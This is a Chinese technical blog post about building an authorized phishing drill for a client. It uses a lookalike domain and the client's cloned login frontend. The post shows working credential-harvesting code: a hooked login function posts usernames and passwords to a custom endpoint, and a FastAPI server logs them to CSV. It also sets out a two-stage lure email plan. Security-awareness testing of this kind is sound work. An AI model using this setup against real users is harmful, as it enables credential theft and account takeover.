---
title: "请君入瓮：草台班子实施的一次钓鱼演练环境搭建"
date: 2025-08-29
tags:
  - Javascript
categories:
  - 前端
---

受限于奇奇怪怪的客户需求和场景，不得不用草台班子的方式，快速搭建了一个钓鱼演练环境。

<!--more-->

## 背景

在某次重要攻防演练中，某客户因高权限员工被钓鱼导致靶标失陷，因此在演练结束后我们需要配合客户开展一次钓鱼演练。演练形式是向全体员工邮箱发送钓鱼邮件，诱导员工点击邮件中的链接，在伪造的内部系统页面中输入账号密码。

为此我们申请了一个高仿客户官方域名的伪造域名，计划通过云企业邮箱服务发送邮件，并在该域名下部署伪造的内部系统。

## 前期尝试

用 SingleFile 插件保存目标网站实现仿站，生成大约 10MB 大小的单个 html 文件。

通过 Caddy 部署，确保 80、443 端口全公网可访问以实现自动 Let's Encrypt 证书：

```json
<Faked Domain Name> {
  encode
  file_server
}
```

为获取用户输入的账号密码信息，尝试使用 Gophish，但发现无法为 Landing Page 设置 HTTPS。因此计划手动实现钓鱼信息收集，在 html 中添加 js 片段，使用 `fetch` 将账号信息提交至 `/api/vcode`（实际指向同一主机上另一端口启动的自定义服务）。但客户要求用户点击登录才算钓鱼成功，因此需要保留获取验证码->登录逻辑。

这就导致**从钓鱼站请求真实站**这一过程成为必须，于是需要解决跨站 CORS 问题，可以通过 iframe+form 的形式解决。但后续了解到获取验证码接口需要提交账号密码信息，而密码字段采用 AES 加密，因此需要获取 AES 密钥。既然都要获取 AES 密钥了，为什么不直接把原系统的前端源码拿来呢？

## 获取前端源码后

由于拿到完整源码，不再使用仿站思路而是直接重新部署一套前端，相比仿站的主要优势在于：

- 无需关注前后端交互逻辑，基本也不需要担心与后端交互逻辑出错
- 基于 js 的动态前端交互逻辑更完整、一致，例如输入框为空时在下方显示错误提示信息、获取验证码按钮点击后变为已发送等
- 通过前端框架提供的开发服务器直接解决 CORS 问题（需要 dev 模式启动，因此部署主机需要 node 环境）
- 直接使用前端框架能力实现额外逻辑

钓鱼信息收集逻辑实现：

```js
//  登录接口及逻辑
const postUserLogin = async params => {
  try {
    let response: any = await postLogin(params);
    if (response.code == 0) {
      try {
        await http.post("/app/login", params, {
          headers: { "Content-Type": "application/json" },
        });
      } catch (error) {
        // ...
      }
    } else {
      // ...
    }
  } catch (error) {
    // ...
  }
};
```

这里 `postLogin` 是原本发起登录请求的函数，在登录成功后，我们将账号密码发送到 `/app/login` 这个我们自定义的后端接口完成收集。

修改开发服务器代理配置，使用生产地址。随后修改 Vite 配置，关闭热重载和自动打开浏览器的功能，并启用 HTTPS（证书由 Caddy 自动申请）：

```json
// server
    server: {
      hmr: false,
      port: 443,
      open: false,
      cors: false,
      host: true,
      https: {
        key: 'certs/<Fake Domain Name>.key',
        cert: 'certs/<Fake Domain Name>.crt'
      },
      proxy,
    },
```

最后根据原业务逻辑设置生产环境的 APPCODE 以通过鉴权。

## 收集登录信息

使用自定义服务器实现，基于 WAF 的 `acw_tc` 字段识别不同用户：

```python
from fastapi import FastAPI, Request
from pydantic import BaseModel
import csv
import os
from datetime import datetime

app = FastAPI()


class LoginRequest(BaseModel):
    username: str
    password: str
    type: str
    captcha: str


@app.post("/app/login")
async def login(request: Request, login_data: LoginRequest):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get acw_tc from cookies
    acw_tc = request.cookies.get("acw_tc", "")

    # Prepare data row
    row_data = [
        login_data.username,
        login_data.password,
        login_data.type,
        login_data.captcha,
        acw_tc,
        time,
    ]

    # Write to CSV file
    csv_file = "data.csv"
    file_exists = os.path.exists(csv_file)

    with open(csv_file, mode="a", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)

        # Write header if file doesn't exist
        if not file_exists:
            writer.writerow(
                ["username", "password", "type", "captcha", "acw_tc", "time"]
            )

        writer.writerow(row_data)

    return {"status": "success"}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)
```

Vite 开发服务器添加一条代理规则：

```js
const ret: ProxyTargetList = {
  [API_URL]: {
    target: API_TARGET_URL,
    changeOrigin: true,
    // rewrite: (path) => path.replace(new RegExp(`^${API_URL}`), ''),
  },
  '/app': {
    target: 'http://localhost:8000',
    changeOrigin: true,
  },
```

使用额外的中间件来收集访问日志：

```js
import type { Plugin } from 'vite';
import type { IncomingMessage, ServerResponse } from 'http';

interface ExtendedRequest extends IncomingMessage {
  ip?: string;
}

export function createAccessLogPlugin(): Plugin {
  return {
    name: 'access-log',
    configureServer(server) {
      server.middlewares.use((req: ExtendedRequest, res: ServerResponse, next: () => void) => {
        const sourceIP =
          req.ip ||
          req.socket?.remoteAddress ||
          (req.headers['x-forwarded-for'] as string) ||
          'unknown';
        const requestPath = req.url || '';
        const method = req.method || '';

        const acwTc = parseCookie(req.headers.cookie, 'acw_tc') || 'none';

        const shouldLog = !isStaticRequest(requestPath);

        const originalEnd = res.end.bind(res);
        res.end = function (...args: any[]) {
          const statusCode = res.statusCode;

          if (shouldLog) {
            console.log(
              `[${new Date().toISOString()}] ${method} ${requestPath} ${sourceIP} ${statusCode} acw_tc=${acwTc}`,
            );
          }

          return originalEnd(...args);
        };

        next();
      });
    },
  };
}

function parseCookie(cookieHeader: string | undefined, name: string): string | undefined {
  if (!cookieHeader) return undefined;
  const cookies = cookieHeader.split(';').map((cookie) => cookie.trim());
  const targetCookie = cookies.find((cookie) => cookie.startsWith(`${name}=`));
  return targetCookie ? targetCookie.substring(name.length + 1) : undefined;
}

function isStaticRequest(path: string): boolean {
  const staticExtensions = [
    '/@',
    '.hot-update.',
    '__vite_ping',
    '.less',
    '.png',
    '.svg',
    '.css',
    '.ts',
    '.vue',
    '.mjs',
    '.js',
    '.ico',
    '.jpg',
    '.jpeg',
    '.gif',
    '.woff',
    '.woff2',
    '.ttf',
    '.eot',
  ];

  return staticExtensions.some((ext) => path.includes(ext));
}
```

```js
// plugins
    plugins: [...createVitePlugins(isBuild), createAccessLogPlugin()],
```

## 部署运行

前端：

```bash
$ nohup npm run dev &
```

后端：

```bash
$ nohup fastapi run main.py &
```

## 安全性

由于 Vite 开发服务器允许客户端直接访问到源码目录下的文件（.env 等敏感文件会 403），同时站点本身连通真实的管理后台，需要为钓鱼站点设置严格的访问白名单（使用云防火墙实现）。

## 演练计划

1. 上午向部分员工发送第一封邮件，内容大意为重保活动期间需要对账号进行安全性验证，需要用户点击按钮登录内部系统按系统提示操作。使用 163 邮箱作为发件地址，降低可信度。
2. 下午向全体员工发送第二封邮件，内容大意为上午检测到部分同事收到钓鱼邮件，需要全体用户登录内部系统紧急修改密码。使用高仿域名邮箱作为发件地址，提高可信度。
3. 邮件内链接均指向钓鱼页面，成功登录后后端记录账号名称、加密后密码、验证码、用户标识、登录时间等信息
4. 演练结束后统计信息：邮件成功投递数（邮件阅读次数无法统计到）、钓鱼页面访问次数/人数（基于用户标识）、成功登录次数/人数、成功登录的所有记录等
